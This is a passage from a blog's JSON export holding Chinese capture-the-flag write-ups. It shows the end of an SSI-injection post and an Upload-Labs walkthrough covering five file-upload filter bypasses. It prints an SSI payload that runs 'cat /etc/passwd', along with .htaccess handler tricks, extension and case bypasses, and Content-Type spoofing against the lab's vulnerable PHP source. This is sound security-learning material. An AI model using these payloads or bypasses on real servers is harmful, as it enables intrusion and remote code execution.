src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210417102904.png\"></p>\n<p>看了看文件后缀是一格没有见过的：<code>shtml</code>，然后学到到了shtml有一种漏洞：<a href=\"https://blog.csdn.net/qq_40657585/article/details/84260844\">SSI注入漏洞</a></p>\n<blockquote>\n<p>SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。</p>\n</blockquote>\n<p>简单的命令执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;--&gt;&#x27;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</span><br></pre></td></tr></table></figure>\n\n<p>我使用了反弹shell，自行修改一下命令即可。在/var/www/html目录下可以找到一个名为<code>flag_990c66bf85a09c664f0b6741840499b2</code>的文件，获得flag</p>\n"},{"title":"Upload-Labs(一)","date":"2020-11-08T11:23:16.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111104319.png","_content":"\n## 介绍\n\n> 大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。\n\n在线靶机地址：\n\n* [linux环境](https://buuoj.cn/challenges#Upload-Labs-Linux)\n* [windows环境](https://buuoj.cn/challenges#[Windows]Upload-Labs-Windows)\n\n\n\n## Pass-01\n\n​\t尝试上传php木马，发现提示上传错误\n\n![](https://s1.ax1x.com/2020/11/08/BTKbfs.png)\n\n​\t提示只能上传`jpg、png、gif`类型的图片。查看源码发现是一个前端的后缀过滤，那么我们尝试绕过前端的JS代码。\n\n​\t源码：\n\n```javascript\nfunction checkFile() {\n    var file = document.getElementsByName('upload_file')[0].value;\n    if (file == null || file == \"\") {\n        alert(\"请选择要上传的文件!\");\n        return false;\n    }\n    //定义允许上传的文件类型\n    var allow_ext = \".jpg|.png|.gif\";\n    //提取上传文件的类型\n    var ext_name = file.substring(file.lastIndexOf(\".\"));\n    //判断上传文件类型是否允许上传\n    if (allow_ext.indexOf(ext_name + \"|\") == -1) {\n        var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name;\n        alert(errMsg);\n        return false;\n    }\n}\n```\n\n\n\n​\t把文件后缀名改成jpg格式上传，使用**burp suit**抓包。把`.jpg`后缀重新改为`.php`即可实现绕过前端JS代码。\n\n![](https://s1.ax1x.com/2020/11/08/BTM5g1.png)\n\n​\t然后右键打开图片，代码成功执行。完工\n\n![](https://s1.ax1x.com/2020/11/08/BTQV8s.png)\n\n​\t注：后面题目的php代码都使用`2333.php`：\n\n```php\n<?php eval(phpinfo());\n```\n\n​\t执行结果是打印出php版本信息。\n\n\n\n## Pass-02\n\n​\t源码：\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            \n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '文件类型不正确，请重新上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t发现文件判断是根据`image/jpeg、image/png...`进行过滤判定，这些值都是Http请求中的**Content-Type**常见的值，通常浏览网页中各种各样的文件类型的就是通过它判断。那么这道题的目标就是绕过它。贴一个我参考值种类的博客:[Http请求中Content-Type](https://www.cnblogs.com/klb561/p/10090540.html)。\n\n​\t同样是burp抓包修改**Content-Type**的值。\n\n![](https://s1.ax1x.com/2020/11/08/BT1EXq.png)\n\n​\t打开图片，php代码成功执行。完工\n\n\n\n## Pass-03\n\n源码：\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array('.asp','.aspx','.php','.jsp');\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //收尾去空\n\n        if(!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;            \n            if (move_uploaded_file($temp_file,$img_path)) {\n                 $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t发现只过滤了`.asp、.aspx、.php、.jsp`文件，那么可以使用`php3、phtml、phps、php5`文件绕过过滤，并执行语句。通常，在嵌入了php脚本的html中，使用 `phtml`作为后缀名；而php3，我的理解是php之前版本的文件后缀，如`php5`。\n\n​\t直接把`2333.php`改为`2333.php3`上传打开，执行成功。完工\n\n![](https://s1.ax1x.com/2020/11/09/BTq2cV.png)\n\n\n\n## Pass-04\n\n源码：\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //收尾去空\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件不允许上传!';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t好家伙，这次直接一大堆文件都被过滤了，几乎有问题的都在数组里。发现没有.`htaccess`文件过滤，所以上传一个.`htaccess`文件内容如下：\n\n```\nSetHandler application/x-httpd-php\n```\n\n​\t原理的话我讲一下个人的见解：.`htaccess`文件是一个`apache`服务器的配置文件，它的作用就是对于该目录下的所有文件都需要符合这个配置文件。然后上传的文件内容作用是：所有文件访问时都会解析为`php`。参考的博客：[htaccess使用方法介绍](https://www.cnblogs.com/gyrgyr/p/10773118.html)。\n\n​\t接下来上传`2333.jpg`图片木马，再打开就会被成功解析为`php`文件并执行：\n\n![](https://s1.ax1x.com/2020/11/09/BTqoN9.png)\n\n![](https://s1.ax1x.com/2020/11/09/BTqqc6.png)\n\n​\t完工\n\n\n\n## Pass-05\n\n 源码：\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t细心的话可以发现，这道题的源码中在末尾添加了`.htaccess`文件过滤，但是也少了一条语句\n\n```php\n$file_ext = strtolower($file_ext); //转换为小写\n```\n\n目标就很明确了，直接使用大小写绕过过滤。\n\n![](https://s1.ax1x.com/2020/11/09/BTLmNj.png)\n\n​\t打开图片成功执行。完工\n\n","source":"_posts/Upload-Labs1.md","raw":"---\ntitle: Upload-Labs(一)\ndate: 2020-11-08 19:23:16\ntags: \n- 文件上传漏洞\ncategories: \n- DROPS\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111104319.png\n---\n\n## 介绍\n\n> 大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。\n\n在线靶机地址：\n\n* [linux环境](https://buuoj.cn/challenges#Upload-Labs-Linux)\n* [windows环境](https://buuoj.cn/challenges#[Windows]Upload-Labs-Windows)\n\n\n\n## Pass-01\n\n​\t尝试上传php木马，发现提示上传错误\n\n![](https://s1.ax1x.com/2020/11/08/BTKbfs.png)\n\n​\t提示只能上传`jpg、png、gif`类型的图片。查看源码发现是一个前端的后缀过滤，那么我们尝试绕过前端的JS代码。\n\n​\t源码：\n\n```javascript\nfunction checkFile() {\n    var file = document.getElementsByName('upload_file')[0].value;\n    if (file == null || file == \"\") {\n        alert(\"请选择要上传的文件!\");\n        return false;\n    }\n    //定义允许上传的文件类型\n    var allow_ext = \".jpg|.png|.gif\";\n    //提取上传文件的类型\n    var ext_name = file.substring(file.lastIndexOf(\".\"));\n    //判断上传文件类型是否允许上传\n    if (allow_ext.indexOf(ext_name + \"|\") == -1) {\n        var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name;\n        alert(errMsg);\n        return false;\n    }\n}\n```\n\n\n\n​\t把文件后缀名改成jpg格式上传，使用**burp suit**抓包。把`.jpg`后缀重新改为`.php`即可实现绕过前端JS代码。\n\n![](https://s1.ax1x.com/2020/11/08/BTM5g1.png)\n\n​\t然后右键打开图片，代码成功执行。完工\n\n![](https://s1.ax1x.com/2020/11/08/BTQV8s.png)\n\n​\t注：后面题目的php代码都使用`2333.php`：\n\n```php\n<?php eval(phpinfo());\n```\n\n​\t执行结果是打印出php版本信息。\n\n\n\n## Pass-02\n\n​\t源码：\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            \n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '文件类型不正确，请重新上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t发现文件判断是根据`image/jpeg、image/png...`进行过滤判定，这些值都是Http请求中的**Content-Type**常见的值，通常浏览网页中各种各样的文件类型的就是通过它判断。那么这道题的目标就是绕过它。贴一个我参考值种类的博客:[Http请求中Content-Type](https://www.cnblogs.com/klb561/p/10090540.html)。\n\n​\t同样是burp抓包修改**Content-Type**的值。\n\n![](https://s1.ax1x.com/2020/11/08/BT1EXq.png)\n\n​\t打开图片，php代码成功执行。完工\n\n\n\n## Pass-03\n\n源码：\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array('.asp','.aspx','.php','.jsp');\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //收尾去空\n\n        if(!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;            \n            if (move_uploaded_file($temp_file,$img_path)) {\n                 $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t发现只过滤了`.asp、.aspx、.php、.jsp`文件，那么可以使用`php3、phtml、phps、php5`文件绕过过滤，并执行语句。通常，在嵌入了php脚本的html中，使用 `phtml`作为后缀名；而php3，我的理解是php之前版本的文件后缀，如`php5`。\n\n​\t直接把`2333.php`改为`2333.php3`上传打开，执行成功。完工\n\n![](https://s1.ax1x.com/2020/11/09/BTq2cV.png)\n\n\n\n## Pass-04\n\n源码：\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //收尾去空\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件不允许上传!';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t好家伙，这次直接一大堆文件都被过滤了，几乎有问题的都在数组里。发现没有.`htaccess`文件过滤，所以上传一个.`htaccess`文件内容如下：\n\n```\nSetHandler application/x-httpd-php\n```\n\n​\t原理的话我讲一下个人的见解：.`htaccess`文件是一个`apache`服务器的配置文件，它的作用就是对于该目录下的所有文件都需要符合这个配置文件。然后上传的文件内容作用是：所有文件访问时都会解析为`php`。参考的博客：[htaccess使用方法介绍](https://www.cnblogs.com/gyrgyr/p/10773118.html)。\n\n​\t接下来上传`2333.jpg`图片木马，再打开就会被成功解析为`php`文件并执行：\n\n![](https://s1.ax1x.com/2020/11/09/BTqoN9.png)\n\n![](https://s1.ax1x.com/2020/11/09/BTqqc6.png)\n\n​\t完工\n\n\n\n## Pass-05\n\n 源码：\n\n```php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n```\n\n​\t细心的话可以发现，这道题的源码中在末尾添加了`.htaccess`文件过滤，但是也少了一条语句\n\n```php\n$file_ext = strtolower($file_ext); //转换为小写\n```\n\n目标就很明确了，直接使用大小写绕过过滤。\n\n![](https://s1.ax1x.com/2020/11/09/BTLmNj.png)\n\n​\t打开图片成功执行。完工\n\n","slug":"Upload-Labs1","published":1,"updated":"2021-12-30T09:42:54.196Z","_id":"ckrr3f9at000ihotc4nf8a84p","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h2><blockquote>\n<p>大部分的网站和应用系统都有上传功能，而程序员在开发任意文件上传功能时，并未考虑文件格式后缀的合法性校验或者是否只在前端通过js进行后缀检验。这时攻击者可以上传一个与网站脚本语言相对应的恶意代码动态脚本，例如(jsp、asp、php、aspx文件后缀)到服务器上，从而访问这些恶意脚本中包含的恶意代码，进行动态解析最终达到执行恶意代码的效果，进一步影响服务器安全。</p>\n</blockquote>\n<p>在线靶机地址：</p>\n<ul>\n<li><a href=\"https://buuoj.cn/challenges#Upload-Labs-Linux\">linux环境</a></li>\n<li><a href=\"https://buuoj.cn/challenges#[Windows]Upload-Labs-Windows\">windows环境</a></li>\n</ul>\n<h2 id=\"Pass-01\"><a href=\"#Pass-01\" class=\"headerlink\" title=\"Pass-01\"></a>Pass-01</h2><p>​    尝试上传php木马，发现提示上传错误</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/08/BTKbfs.png\"></p>\n<p>​    提示只能上传<code>jpg、png、gif</code>类型的图片。查看源码发现是一个前端的后缀过滤，那么我们尝试绕过前端的JS代码。</p>\n<p>​    源码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkFile</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> file = <span class=\"built_in\">document</span>.getElementsByName(<span class=\"string\">&#x27;upload_file&#x27;</span>)[<span class=\"number\">0</span>].value;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file == <span class=\"literal\">null</span> || file == <span class=\"string\">&quot;&quot;</span>) &#123;</span><br><span class=\"line\">        alert(<span class=\"string\">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//定义允许上传的文件类型</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> allow_ext = <span class=\"string\">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class=\"line\">    <span class=\"comment\">//提取上传文件的类型</span></span><br><span class=\"line\">    <span class=\"keyword\">var</span> ext_name = file.substring(file.lastIndexOf(<span class=\"string\">&quot;.&quot;</span>));</span><br><span class=\"line\">    <span class=\"comment\">//判断上传文件类型是否允许上传</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (allow_ext.indexOf(ext_name + <span class=\"string\">&quot;|&quot;</span>) == -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> errMsg = <span class=\"string\">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class=\"string\">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class=\"line\">        alert(errMsg);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​    把文件后缀名改成jpg格式上传，使用<strong>burp suit</strong>抓包。把<code>.jpg</code>后缀重新改为<code>.php</code>即可实现绕过前端JS代码。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/08/BTM5g1.png\"></p>\n<p>​    然后右键打开图片，代码成功执行。完工</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/08/BTQV8s.png\"></p>\n<p>​    注：后面题目的php代码都使用<code>2333.php</code>：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">eval</span>(phpinfo());</span><br></pre></td></tr></table></figure>\n\n<p>​    执行结果是打印出php版本信息。</p>\n<h2 id=\"Pass-02\"><a href=\"#Pass-02\" class=\"headerlink\" title=\"Pass-02\"></a>Pass-02</h2><p>​    源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>] == <span class=\"string\">&#x27;image/jpeg&#x27;</span>) || (<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>] == <span class=\"string\">&#x27;image/png&#x27;</span>) || (<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>] == <span class=\"string\">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH.<span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    发现文件判断是根据<code>image/jpeg、image/png...</code>进行过滤判定，这些值都是Http请求中的<strong>Content-Type</strong>常见的值，通常浏览网页中各种各样的文件类型的就是通过它判断。那么这道题的目标就是绕过它。贴一个我参考值种类的博客:<a href=\"https://www.cnblogs.com/klb561/p/10090540.html\">Http请求中Content-Type</a>。</p>\n<p>​    同样是burp抓包修改<strong>Content-Type</strong>的值。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/08/BT1EXq.png\"></p>\n<p>​    打开图片，php代码成功执行。完工</p>\n<h2 id=\"Pass-03\"><a href=\"#Pass-03\" class=\"headerlink\" title=\"Pass-03\"></a>Pass-03</h2><p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;.asp&#x27;</span>,<span class=\"string\">&#x27;.aspx&#x27;</span>,<span class=\"string\">&#x27;.php&#x27;</span>,<span 